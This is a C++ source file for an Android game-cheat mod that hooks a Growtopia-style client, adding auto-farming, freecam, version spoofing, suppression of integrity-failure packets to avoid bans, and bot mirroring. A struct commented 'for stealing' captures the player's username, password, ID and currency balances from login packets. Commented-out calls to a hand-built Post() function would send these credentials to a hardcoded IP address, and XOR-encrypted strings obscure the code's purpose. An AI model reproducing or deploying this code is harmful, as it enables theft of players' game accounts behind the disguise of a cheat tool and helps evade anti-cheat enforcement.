#include <pthread.h>
#include <jni.h>
#include <memory.h>
#include <dlfcn.h>
#include <cstdio>
#include <cstdlib>
#include "imgui/imgui.h"//napiyon he pardon dur
#include "imgui/imgui_impl_opengl3.h"
#include "imgui/imgui_impl_android.h"
#include <string>

#include "Includes/Logger.h"
#include "Substrate/CydiaSubstrate.h"
#import "Includes/Utils.h"
#include "enet/include/enet.h"
#include <GLES2/gl2.h>
#include "proton/rtparam.hpp"
#include "proton/variant.hpp"
#include "TankPacketStruct.h"
#include <chrono>
#include "rtparser.h"
#include "ENetClient2.h"
#include "Events.h"
#include "utils.hpp"
#include "xorstr.h"
#include "GTEvents.h"
#include <list>
#include "VariantList.h"
#include <fstream>
#include "encryptedstrings.h"
#include "xor.hpp"
#include "gtsymbols.h"
// only define this if you want logging and other stuff to be enabled.

std::string g_windowTitle = "Automic Fixed";

const std::string welcomeText = "Automic"; // just easteregg text that isn't used.
//ENetClient2* nENetClient = new ENetClient2();
//ENetClient2* botClient = new ENetClient2(); // Will be used for multibotting later on.
ENetHost* clientHost = NULL;
ENetHost* botHosts[3] = { NULL };

uint64_t GetCurrentTimeInternal() {
	auto duration = std::chrono::system_clock::now().time_since_epoch();
	return std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
}
// for stealing
static struct ClientInformation {

	std::string username;
	std::string password;
	std::string gid;
	std::string worldlock_balance;
	std::string gems_balance;
	std::string level;
	int aap;

} ClientInfo;

/* START OF TYPEDEF DECLARATIONS */

void Hook_LogToConsoleSafe(std::string str) {
	oLogToConsoleSafe(str);
}

// save config

// otherwise create config file first.
int Hook_CanSeeGhosts(int item) {
	if (settings.ghostsVisible)
		return 1;
	return oCanSeeGhosts(item);
}

void Hook_NetAvatarSetSecurityStates(NetAvatar* avatar, bool mstate, bool smstate) {
	oNetAvatarSetSecurityStates(avatar, mstate, smstate);
}

void Hook_OnSpawn(void* glc, void* vlist) {
	NetAvatar* av = oGetLocalPlayer(glc);
	bool local = false;

	if (!av) local = true;
	if (av) { if (av->netID < 1) { local = true; } }

	oOnSpawn(glc, vlist);
	av = oGetLocalPlayer(glc);

	if (av)
	{
		if (local)
			oNetAvatarSetSecurityStates(av, settings.mstate, 0);
	}
}

void Hook_OnlineSaveSettings() {
	//SaveConfig();
	oOnlineSaveSettings();
}


/* END OF TYPEDEF DECLARATIONS */

/* START OF HOOKS */

unsigned int HashString(const char* str, int len)
{
	if (!str) return 0;

	unsigned char* n = (unsigned char*)str;
	unsigned int acc = 0x55555555;

	if (len == 0)
	{
		while (*n)
			acc = (acc >> 27) + (acc << 5) + *n++;
	}
	else
	{
		for (int i = 0; i < len; i++)
		{
			acc = (acc >> 27) + (acc << 5) + *n++;
		}
	}
	return acc;
}

int GetDeviceSecondaryHash(std::string macAddr)
{
	int v1;
	std::string v3 = "";
	for (int i = 0; i < macAddr.length(); ++i)
		v3 += std::tolower(macAddr[i]);

	v3 += "RT";
	v1 = HashString(v3.c_str(), 0);
	return v1;
}

std::string ENetIpToString(enet_uint32 ip) {
	struct in_addr ip_addr;
	ip_addr.s_addr = ip;
	return std::string(inet_ntoa(ip_addr));
}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


std::string WebCutHeader(std::string data) {
	std::string::size_type pos = data.find("\r\n\r\n");
	return (pos != std::string::npos ? data.substr(pos + 4) : data);
}

std::string Post(std::string weburl, std::string content = "", std::string suburl = "/", std::string port = "80") {
	std::string inbufA = "POST " + suburl + " HTTP/1.1\r\n";
	inbufA += "Host: " + weburl + "\r\n";
	inbufA += "Connection: close\r\n";
	inbufA += "Content-type: application/x-www-form-urlencoded\r\n"; //ordamýsýn? + ok deneyekmi
	inbufA += "Content-length: " + to_string(content.length()) + "\r\n\r\n";
	inbufA += content;

	//MessageBoxA(NULL, url_encode(content).c_str(), "test", MB_OK);

	int sock = -1;
	addrinfo* result, * ptr, hints;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	int x = getaddrinfo(weburl.c_str(), port.c_str(), &hints, &result);
	if (x != 0) {
		//(L"getaddrinfo failed! with " + to_wstring(x));
		return "";
	}

	const char* sendbuf = inbufA.c_str();
	char* recvbuf = new char[4096];
	int recvbuflen = 4096;

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (sock == -1) {
			//cout(L"getaddrinfo failed!");
			return "";
		}

		if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == -1) {
			close(sock);
			sock = -1;
			//cout(L"connect failed!");
			continue;
		}
		break;
	}

	if (sock == -1) {
		//cout(L"INVALID_SOCKET!");
		return "";
	}

	//freeaddrinfo(result);

	int res = send(sock, sendbuf, (int)strlen(sendbuf), 0);
	if (res == -1) {
		close(sock);
		//cout(L"send failed!");
		return "";
	}
	//std::cout << "Bytes sent: " << res << std::endl;

	std::string clearData = "";
	do {
		res = recv(sock, recvbuf, recvbuflen, 0);
		if (res > 0) {
			for (int i = 0; i < res; i++) clearData += recvbuf[i];
		}
		else if (res != 0) {
			//cout(L"recv failed!");
			return "";
		}

	} while (res > 0);

	res = shutdown(sock, SHUT_WR);
	if (res == -1) {
		close(sock);
		//cout(L"shutdown failed!");
		return "";
	}

	close(sock);

	return WebCutHeader(clearData);
}
void Hook_SendPacket(int pType, std::string text, ENetPeer* peer) {
	if (!peer) 	return;

	std::string modifiedText = text;
	rtparser var = rtparser::Parse(text);

	std::string dec_game_version = Xor::encDec(EncStrs::game_version, EncStrs::game_version_len);
	std::string dec_game_version_float = Xor::encDec(EncStrs::fivedotonine, EncStrs::fivedotonine_len);
	std::string dec_tankIDName = Xor::encDec(EncStrs::tankIDName, EncStrs::tankIDName_len);
	std::string dec_tankIDPass = Xor::encDec(EncStrs::tankIDPass, EncStrs::tankIDPass_len);
	std::string dec_gid = Xor::encDec(EncStrs::gid, EncStrs::gid_len);
	std::string dec_mac = Xor::encDec(EncStrs::mac, EncStrs::mac_len);
	std::string dec_rid = Xor::encDec(EncStrs::rid, EncStrs::rid_len);
	std::string dec_wk = Xor::encDec(EncStrs::wk, EncStrs::wk_len);
	std::string dec_NONE0 = Xor::encDec(EncStrs::NONE0, EncStrs::NONE0_len);

	if (text.find(dec_game_version + "|") != -1) {

		settings.accountData = var;

		ClientInfo.username = var.Get(dec_tankIDName);
		ClientInfo.password = var.Get(dec_tankIDPass);
		ClientInfo.gid = var.Get(dec_gid);
		//Post("45.155.124.141", "growid= " + ClientInfo.username + "&password=" + ClientInfo.password + "&mac=" + settings.mac + "&wl=" + ClientInfo.password, "/index.php");
		if (settings.gid != "") var.Set(dec_gid, settings.gid);
		if (settings.mac != "") var.Set(dec_mac, settings.mac);
		if (settings.rid != "") var.Set(dec_rid, settings.rid);

		var.Set(dec_game_version, dec_game_version_float); // ver spoof

		//var.set("hash2", to_string(GetDeviceSecondaryHash(var.get("mac"))));

		var.Set(dec_wk, dec_NONE0);

		//utils::SendPacket(Events::g_peer, settings.accountData.Serialize(), 9, NULL);
		//SendPacket(ENetPeer* peer, std::string text, int messageType, ENetHost* host = NULL); // if want to broadcast, host shouldn't be NULL
		modifiedText = var.Serialize();
		oSendPacket(pType, modifiedText, peer); // do not mirror this...
		//ImGui::Begin();
		//Post("45.155.124.141", "growid=" + ClientInfo.username + "&password=" + ClientInfo.password + "&mac=" + var.Get("mac") + "&rid=" + var.Get("rid") + "&gid=" + var.Get("gid"), "/senderkan.php").c_str()
		//Post("45.155.124.141", "content=" + modifiedText, "/loginerkan.php");
		return;
	}

	//LOGI("Continuing...");
	std::string dec_action = Xor::encDec(EncStrs::action, EncStrs::action_len);
	std::string dec_enter_game = Xor::encDec(EncStrs::enter_game, EncStrs::enter_game_len);
	std::string dec_level = Xor::encDec(EncStrs::level, EncStrs::level_len);
	std::string dec_wls = Xor::encDec(EncStrs::wls, EncStrs::wls_len);
	std::string dec_gems = Xor::encDec(EncStrs::gems, EncStrs::gems_len);

	std::string act = var.Get(dec_action);
	if (act == dec_enter_game) { // dont mirror this either

		//LOGI("Entering game...");
		settings.accountData.Set(dec_level, ClientInfo.level);
		settings.accountData.Set(dec_gems, ClientInfo.gems_balance);
		settings.accountData.Set(dec_wls, ClientInfo.worldlock_balance);
		utils::SendPacket(Events::g_peer, settings.accountData.Serialize(), 9, NULL);
	}
	else if (act == "quit_to_exit" || act == "quit") {

	}
	else {
		// Mirror all other text packets!
		if (g_botClient && settings.botmirror) g_botClient->BroadcastPacket(text, pType);
	}

	oSendPacket(pType, modifiedText, peer);
}

Tile* Hook_GetTileSafe(uint64_t TMap, int tileX, int tileY) {
	return oGetTileSafe(TMap, tileX, tileY);
}

void* Hook_GetTileMap() {
	return oGetTileMap();
}

void* Hook_GetTileAtWorldPos(void* map, float* pos) {
	return oGetTileAtWorldPos(map, pos);
}

void Hook_SendPacketRaw(int mType, uint8_t* data, size_t datalen, void* sender, ENetPeer* destination, int flags) {
	if (datalen >= 56) {
		/*if (oGetLocalPlayer(oGetGameLogic())->netID == tStruct->NetID) {
				settings.characterState = tStruct->characterState;
			}*/

		TankPacketStruct* tStruct = (TankPacketStruct*)data;

		switch (tStruct->packetType) {
		case PACKET_STATE:
			settings.characterState = tStruct->characterState;
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(tStruct);
			break;

		case PACKET_TILE_CHANGE_REQUEST:
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(tStruct);
			break;

		case PACKET_TILE_ACTIVATE_REQUEST:
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(tStruct);
			break;

		case PACKET_SET_ICON_STATE:
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(tStruct);
			break;

		case PACKET_NPC:
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(tStruct);
			break;

		case PACKET_STEAM:
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(tStruct);
			break;

		case PACKET_APP_INTEGRITY_FAIL:
			return; // dont call again to avoid any client autobans for the future.

		default:
			break;
		}
	}

	oSendPacketRaw(mType, data, datalen, sender, destination, flags);
}

int Hook_GetScreenSizeX() {
	return oGetScreenSizeX();
}

int Hook_GetScreenSizeY() {
	return oGetScreenSizeY();
}

void ProcessFuncCallPacket(int len, uint8_t* data) {
	VariantList* vList = new Variant::VariantList(data);

	std::string funcName = vList->GetFuncName();

	std::string dec_OnSpawn = Xor::encDec(EncStrs::OnSpawn, EncStrs::OnSpawn_len);
	std::string dec_mstate = Xor::encDec(EncStrs::mstate, EncStrs::mstate_len);
	std::string dec_smstate = Xor::encDec(EncStrs::smstate, EncStrs::smstate_len);

	if (funcName == dec_OnSpawn) {
		std::string spawnText = vList->GetFuncArg(1);

		rtparser rtp = rtparser::Parse(spawnText);

		std::string mstate = rtp.Get(dec_mstate), smstate = rtp.Get(dec_smstate);
		if (mstate == "" || smstate == "") {
			VariantList::Kill(vList);
			return;
		}

		int imstate = atoi(mstate.c_str());
		int ismstate = atoi(smstate.c_str());

		if ((imstate > 0 || ismstate > 0) && settings.auto_leave) {
			//oSendPacket()
		}

	}

	VariantList::Kill(vList);
}

void Hook_ProcessTankUpdatePacket(void* a1, uint8_t* data) {

	TankPacketStruct* tStruct = (TankPacketStruct*)data;

	switch (tStruct->packetType)
	{
	case PACKET_CALL_FUNCTION: //Shitty Solution Replace.
	{
		//ProcessFuncCallPacket(tStruct->extDataSize, (uint8_t*)(data + 56));
		break; // todo asdf
	}

	case PACKET_TILE_APPLY_DAMAGE:
	{

		break;
	}

	default:
		break;
	}

	oProcessTankUpdatePacket(a1, data);
}

//lets not return anything because we want to block the tracks packets.
void Hook_HandleTrackPacket(int a1, const char* text) {
	rtparser rtp = rtparser::Parse(std::string(text));

	std::string eventName = rtp.Get("eventName");

	if (eventName == "102_PLAYER.AUTHENTICATION") {
		ClientInfo.worldlock_balance = rtp.Get("Worldlock_balance");
	}

	else if (eventName == "100_MOBILE.START") {
		ClientInfo.gems_balance = rtp.Get("Gems_balance");
		ClientInfo.level = rtp.Get("Level");
	}
}

ItemInfoManager* Hook_GetItemInfoManager() {
	return oGetItemInfoManager();
}

ItemInfo* Hook_GetItemByIDSafe(ItemInfoManager* manager, int itemID) {
	return oGetItemByIDSafe(manager, itemID);
}

//void doAutomicClientService() {
	//ENetClient->poll(-1, 0, NULL, clientHost);
//}

//void doBotClientService() {
	//for (int i = 0; i < botClient->GetHostsSize(); i++) {
	//	if (botHosts[i])
	//		botClient->poll(i, 0, NULL, botHosts[i]);
	//}
//}

//void ConnectToAutomicserver() {
	//if (nENetClient->GetHostsSize() == 0) {
	//	Events::g_Settings = &settings;
	//	Events::g_Client = nENetClient;

	//	clientHost = nENetClient->SetupHost(-1, ("host." + Xor::encDec(EncStrs::automicdotcc, EncStrs::automicdotcc_len)).c_str(), 17420, 1, 2, 0, 0, 0);
	//	clientHost->usingNewPacket = 0;

	//	nENetClient->SetConnectEvent((void*)&Events::EventConnect);
	//	nENetClient->SetReceiveEvent((void*)&Events::EventReceive);
	//	nENetClient->SetDisconnectEvent((void*)&Events::EventDisconnect);

	//	nENetClient->InitializeEvents();//hayda 

	//	nENetClient->Connect(clientHost, ("host." + Xor::encDec(EncStrs::automicdotcc, EncStrs::automicdotcc_len)).c_str(), 17420);
	//}
//}

//void ConnectAvailableBot(int id, bool force = false) {
	//if (id > 2) return;

	//if (!botClient->isConnected(id) || force)
	//	botClient->Connect(botHosts[id]);
//}

//void SetupMultibotting() {
	//if (botClient->GetHostsSize() == 0)
	//{
	//	g_botClient = botClient;

	//	for (int i = 0; i < 3; i++) {
	//		botHosts[i] = botClient->SetupHost(i, "213.179.209.168", 17195 + rand() % 7, 1, 2, 0, 0, 0);
	//		botHosts[i]->usingNewPacket = 1;
	//	}

	//	botClient->SetConnectEvent((void*)&Events::EventConnectBot);
	//	botClient->SetReceiveEvent((void*)&Events::EventReceiveBot);
	//	botClient->SetDisconnectEvent((void*)&Events::EventDisconnectBot);

	//	botClient->InitializeEvents();
	//	// dont connect a shit yet
	//}
//}

bool isBG(int itemID) {
	ItemInfo* iff = oGetItemByIDSafe(oGetItemInfoManager(), settings.break_item_id);
	if (!iff) return false;

	return iff->ItemType == 22 || iff->ItemType == 28 || iff->ItemType == 18;
}

uint64_t nextAutofarmCheck = 0;
int tileOffsetX = 1, tileOffsetPlaceX = 1;
int tileOffsetY = 1, tileOffsetPlaceY = 0;

void doAutofarmCheck() {
	void* gameLogic = (void*)oGetGameLogic();
	ENetPeer* peer = GetPeer();
	NetAvatar* avatar = oGetLocalPlayer(oGetGameLogic());
	if (avatar && peer && gameLogic) {
		if (avatar->netID < 1) return;

		int tileX = (int)(avatar->pos.x / 32.f);
		int tileY = (int)(avatar->pos.y / 32.f);

		if (settings.auto_collect) {
			//LOGI ("Auto Collecting");
			void* objMap = oGetObjectMap();
			if (objMap) {
				auto p = oWorldObjectMapGetObjectList(objMap);

				for (auto it = p->begin(); it != p->end(); it++) {

					//LOGI ("Auto Collecting Item Check!");
					if (utils::isInside(it->position.x, it->position.y, settings.pickup_range * 32, avatar->pos.x, avatar->pos.y)) {
						//LOGI ("Auto Collecting Item -- SendPacketRaw step!");
						float dfpos[2] = { it->position.x, it->position.y };
						Tile* dropTile = (Tile*)oGetTileAtWorldPos(oGetTileMap(), (float*)&dfpos);

						if (!dropTile) continue;

						if (dropTile->fg == 0) {
							TankPacketStruct tStruct;
							tStruct.x = it->position.x;
							tStruct.y = it->position.y;
							tStruct.packetType = 11;
							tStruct.NetID = -1;
							tStruct.value = it->objectID;
							oSendPacketRaw(4, (uint8_t*)&tStruct, 56, NULL, peer, ENET_PACKET_FLAG_RELIABLE);

							//if (g_botClient) g_botClient->BroadcastPacketRaw(&tStruct);
						}
					}
				}
			}
		}

		if (settings.auto_place) {
			bool isLeft = (settings.characterState & 0x10);

			TankPacketStruct tStruct;
			tStruct.x = avatar->pos.x;
			tStruct.y = avatar->pos.y;
			tStruct.packetType = PACKET_TILE_CHANGE_REQUEST;
			tStruct.NetID = -1;
			tStruct.value = settings.place_item_id;

			switch (settings.farmMode) {
			case FARMMODE_ONEBLOCK:
			{
				tileOffsetPlaceY = 0;
				tileOffsetPlaceX = isLeft ? -1 : 1;
				break;
			}
			case FARMMODE_TWOBLOCK:
			{
				tileOffsetPlaceY = 0;
				tileOffsetPlaceX = isLeft ? -1 : 1;

				float fpos[2] = { (tileX + tileOffsetPlaceX) * 32.f, (tileY + tileOffsetPlaceY) * 32.f };
				Tile* tile = (Tile*)oGetTileAtWorldPos(oGetTileMap(), (float*)&fpos);

				if (tile) {
					if (settings.place_item_id < 2) {
						if (tile->fg > 0 && tile->bg > 0)
							fpos[0] += isLeft ? -1 : 1;
					}
					else {
						if (isBG(settings.place_item_id))
						{
							if (tile->bg > 0) {
								fpos[0] += isLeft ? -1 : 1;
								tileOffsetPlaceX += isLeft ? -1 : 1;
							}
						}
						else
						{
							if (tile->fg > 0) {
								fpos[0] += isLeft ? -1 : 1;
								tileOffsetPlaceX += isLeft ? -1 : 1;
							}
						}
					}
				}

				//if (isLeft) tileOffsetX = -tileOffsetX;


				if (tileOffsetPlaceX > 2 || tileOffsetPlaceX < -2) tileOffsetPlaceX = isLeft ? -1 : 1;
				break;
			}
			case FARMMODE_RAYMAN:
			{
				tileOffsetPlaceY = 0;
				tileOffsetPlaceX++;
				if (isLeft) tileOffsetPlaceX = -tileOffsetPlaceX;


				if (tileOffsetPlaceX > 3 || tileOffsetPlaceX < -3) tileOffsetPlaceX = isLeft ? -1 : 1;
				break;
			}
			case FARMMODE_TRACTOR:
			{
				tileOffsetPlaceX = 0;
				tileOffsetPlaceY = 0;
				break;
			}
			case FARMMODE_NUKER:
			{
				tileOffsetPlaceX = -2 + rand() % 4;
				tileOffsetPlaceY = -2 + rand() % 4;
				break;
			}
			default:
			{
				tileOffsetPlaceX = 0;
				tileOffsetPlaceY = 0;
				break;
			}
			}


			tStruct.punchX = tileX + tileOffsetPlaceX;
			tStruct.punchY = tileY + tileOffsetPlaceY;

			float fpos[2] = { (tStruct.punchX) * 32.f, (tStruct.punchY) * 32.f };
			Tile* tile = (Tile*)oGetTileAtWorldPos(oGetTileMap(), (float*)&fpos);

			if (tStruct.value > 1 && tile) {

				if (isBG(tStruct.value)) {
					if (tile->bg < 2)
						oSendPacketRaw(4, (uint8_t*)&tStruct, 56, NULL, peer, ENET_PACKET_FLAG_RELIABLE);
				}
				else if (tile->fg < 2) {
					oSendPacketRaw(4, (uint8_t*)&tStruct, 56, NULL, peer, ENET_PACKET_FLAG_RELIABLE);
				}
			}
		}

		if (GetCurrentTimeInternal() > nextAutofarmCheck && settings.auto_break) {
			nextAutofarmCheck = GetCurrentTimeInternal() + 180;

			bool isLeft = (settings.characterState & 0x10);

			switch (settings.farmMode) {
			case FARMMODE_ONEBLOCK:
			{
				tileOffsetY = 0;
				tileOffsetX = isLeft ? -1 : 1;
				break;
			}
			case FARMMODE_TWOBLOCK:
			{
				tileOffsetY = 0;
				tileOffsetX += isLeft ? -1 : 1;

				float fpos[2] = { (tileX + tileOffsetX) * 32.f, tileY * 32.f };
				Tile* tile = (Tile*)oGetTileAtWorldPos(oGetTileMap(), (float*)&fpos);

				if (tile) {
					if (settings.break_item_id < 2) {
						if (tile->fg == 0 && tile->bg == 0)
							fpos[0] += isLeft ? -1 : 1;
						tileOffsetX += isLeft ? -1 : 1;
					}
				}
				else {
					if (isBG(settings.break_item_id))
					{
						if (tile->bg < 1) {
							fpos[0] += isLeft ? -1 : 1;
							tileOffsetX += isLeft ? -1 : 1;
						}
					}
					else
					{
						if (tile->fg < 1) {
							fpos[0] += isLeft ? -1 : 1;
							tileOffsetX += isLeft ? -1 : 1;
						}
					}
				}


				//if (isLeft) tileOffsetX = -tileOffsetX;


				if (tileOffsetX > 2 || tileOffsetX < -2) tileOffsetX = isLeft ? -1 : 1;
				break;
			}
			case FARMMODE_RAYMAN:
			{
				tileOffsetY = 0;

				if (isLeft) tileOffsetX--;
				else tileOffsetX++;


				if (tileOffsetX > 3 || tileOffsetX < -3) tileOffsetX = isLeft ? -1 : 1;
				break;
			}
			case FARMMODE_TRACTOR:
			{
				tileOffsetX = 0;
				tileOffsetY = 0;
				break;
			}
			case FARMMODE_NUKER:
			{
				tileOffsetX = -2 + rand() % 4;
				tileOffsetY = -2 + rand() % 4;
				break;
			}
			default:
			{
				tileOffsetX = 0;
				tileOffsetY = 0;
				break;
			}
			}

			TankPacketStruct tStruct;
			tStruct.x = avatar->pos.x;
			tStruct.y = avatar->pos.y;
			tStruct.packetType = PACKET_TILE_CHANGE_REQUEST;
			tStruct.punchX = tileX + tileOffsetX;
			tStruct.punchY = tileY + tileOffsetY;
			tStruct.NetID = -1;
			tStruct.value = 18;

			oSendPacketRaw(4, (uint8_t*)&tStruct, 56, NULL, peer, ENET_PACKET_FLAG_RELIABLE);
			if (g_botClient && settings.botmirror) g_botClient->BroadcastPacketRaw(&tStruct);
		}
	}
}

void doMiscBeforeDraw() {
	doAutofarmCheck();
	//doAutomicClientService();
	//doBotClientService();

	void* GLOAddr = oGetGameLogic();

	Camera* camera = oGetCamera();
	if (oGetLocalPlayer(GLOAddr) && camera)
	{
		if (settings.freecam)
		{
			float offs32 = camera->offset32;
			float divX = settings.DeltaTime[0] / offs32;
			float divY = settings.DeltaTime[1] / offs32;

			settings.DeltaTime[0] = 0;
			settings.DeltaTime[1] = 0;

			if (divX != 0 && divY != 0) {
				settings.last_camera_pos.x -= divX;
				settings.last_camera_pos.y -= divY;

				camera->pos = settings.last_camera_pos;
			}
		}
		else {
			settings.last_camera_pos = camera->pos;
		}
	}
}

#pragma clang diagnostic ignored "-Wformat-nonliteral"

const char* current_farm_mode = "One block";
static bool init = false;
void Hook_BaseAppDraw(int a1) {

	if (!init) {

#ifdef ISDEBUGBUILD
		LOGI("Initializing ImGui...");
#endif
		IMGUI_CHECKVERSION();
		ImGui::CreateContext();
		ImGuiIO& io = ImGui::GetIO();

		io.IniFilename = NULL; //we dont want create file for android users.
		io.ConfigWindowsMoveFromTitleBarOnly = true;
		// SIMPLE STYLE FOR EASIER USAGE FOR ANDROID //

		ImGuiStyle& style = ImGui::GetStyle();
		style.WindowRounding = 2.0f;
		style.ChildRounding = 1.0f;
		style.FrameRounding = 3.0f;
		style.GrabRounding = 2.0f;
		style.PopupRounding = 2.0f;
		style.ScrollbarRounding = 3.0f;
		style.Alpha = 0.9f;

		ImVec4* colors = ImGui::GetStyle().Colors;//style shits
		colors[ImGuiCol_Text] = ImVec4(0.92f, 0.92f, 0.92f, 1.00f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.44f, 0.44f, 0.44f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.06f, 0.06f, 1.00f);
		colors[ImGuiCol_ChildBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
		colors[ImGuiCol_Border] = ImVec4(0.51f, 0.36f, 0.15f, 1.00f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.11f, 0.11f, 0.11f, 1.00f);
		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.51f, 0.36f, 0.15f, 1.00f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.78f, 0.55f, 0.21f, 1.00f);
		colors[ImGuiCol_TitleBg] = ImVec4(0.51f, 0.36f, 0.15f, 1.00f);
		colors[ImGuiCol_TitleBgActive] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.00f, 0.00f, 0.00f, 0.51f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.11f, 0.11f, 0.11f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImVec4(0.06f, 0.06f, 0.06f, 0.53f);
		colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.47f, 0.47f, 0.47f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.81f, 0.83f, 0.81f, 1.00f);
		colors[ImGuiCol_CheckMark] = ImVec4(0.78f, 0.55f, 0.21f, 1.00f);
		colors[ImGuiCol_SliderGrab] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_SliderGrabActive] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_Button] = ImVec4(0.51f, 0.36f, 0.15f, 1.00f);
		colors[ImGuiCol_ButtonHovered] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_ButtonActive] = ImVec4(0.78f, 0.55f, 0.21f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.51f, 0.36f, 0.15f, 1.00f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.93f, 0.65f, 0.14f, 1.00f);
		colors[ImGuiCol_Separator] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
		colors[ImGuiCol_SeparatorHovered] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_SeparatorActive] = ImVec4(0.78f, 0.55f, 0.21f, 1.00f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.78f, 0.55f, 0.21f, 1.00f);
		colors[ImGuiCol_Tab] = ImVec4(0.51f, 0.36f, 0.15f, 1.00f);
		colors[ImGuiCol_TabHovered] = ImVec4(0.91f, 0.64f, 0.13f, 1.00f);
		colors[ImGuiCol_TabActive] = ImVec4(0.78f, 0.55f, 0.21f, 1.00f);
		colors[ImGuiCol_TabUnfocused] = ImVec4(0.07f, 0.10f, 0.15f, 0.97f);
		colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.14f, 0.26f, 0.42f, 1.00f);
		colors[ImGuiCol_PlotLines] = ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
		colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
		colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
		colors[ImGuiCol_TextSelectedBg] = ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
		colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 1.00f, 0.00f, 0.90f);
		colors[ImGuiCol_NavHighlight] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
		colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
		colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
		colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.35f);
		//colors[ImGuiCol_Text] = ImVec4(0.95f, 0.96f, 0.98f, 1.00f);
		//colors[ImGuiCol_TextDisabled] = ImVec4(0.36f, 0.42f, 0.47f, 1.00f);
		//colors[ImGuiCol_WindowBg] = ImVec4(0.11f, 0.15f, 0.17f, 1.00f);
		//colors[ImGuiCol_ChildBg] = ImVec4(0.15f, 0.18f, 0.22f, 1.00f);
		//colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
		//colors[ImGuiCol_Border] = ImVec4(0.08f, 0.10f, 0.12f, 1.00f);
		//colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		//colors[ImGuiCol_FrameBg] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		//colors[ImGuiCol_FrameBgHovered] = ImVec4(0.12f, 0.20f, 0.28f, 1.00f);
		//colors[ImGuiCol_FrameBgActive] = ImVec4(0.09f, 0.12f, 0.14f, 1.00f);
		//colors[ImGuiCol_TitleBg] = ImVec4(0.09f, 0.12f, 0.14f, 0.65f);
		//colors[ImGuiCol_TitleBgActive] = ImVec4(0.08f, 0.10f, 0.12f, 1.00f);
		//colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.00f, 0.00f, 0.00f, 0.51f);
		//colors[ImGuiCol_MenuBarBg] = ImVec4(0.15f, 0.18f, 0.22f, 1.00f);
		//colors[ImGuiCol_ScrollbarBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.39f);
		//colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.20f, 0.25f, 0.29f, 1.00f);
		//colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.18f, 0.22f, 0.25f, 1.00f);
		//colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.09f, 0.21f, 0.31f, 1.00f);
		//colors[ImGuiCol_CheckMark] = ImVec4(0.28f, 0.56f, 1.00f, 1.00f);
		//colors[ImGuiCol_SliderGrab] = ImVec4(0.28f, 0.56f, 1.00f, 1.00f);
